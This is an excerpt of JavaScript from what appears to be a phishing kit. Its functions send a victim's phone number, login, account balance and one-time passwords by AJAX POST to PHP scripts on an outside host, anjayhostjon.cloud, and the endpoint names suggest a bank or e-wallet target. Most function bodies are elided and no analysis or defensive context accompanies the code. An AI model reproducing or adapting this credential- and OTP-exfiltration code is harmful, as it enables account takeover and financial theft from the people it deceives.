function sendHp() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/krengok/otpblm.php',
      type: 'POST',
